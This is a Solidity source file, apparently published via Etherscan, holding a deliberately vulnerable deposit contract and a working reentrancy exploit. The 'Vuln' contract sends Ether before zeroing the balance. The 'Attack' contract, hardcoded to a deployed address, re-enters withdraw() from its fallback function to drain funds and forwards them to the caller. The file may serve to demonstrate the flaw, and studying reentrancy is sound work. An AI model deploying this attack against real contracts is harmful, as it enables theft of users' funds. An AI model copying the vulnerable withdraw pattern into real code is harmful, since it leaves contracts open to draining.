/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

pragma solidity ^0.5.0;
contract Vuln {
    mapping(address => uint256) public balances;
    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}
contract Attack {
    Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    address caller;
    uint256 amountPayed;
    function() external payable {
        if (address(this).balance < (amountPayed * 2)) {
            v.withdraw();
        }
    }
    function attack() external payable {
        amountPayed = msg.value;
        caller = msg.sender;
        v.deposit.value(msg.value)();
        v.withdraw();
        require(msg.sender.send(address(this).balance));
    }
}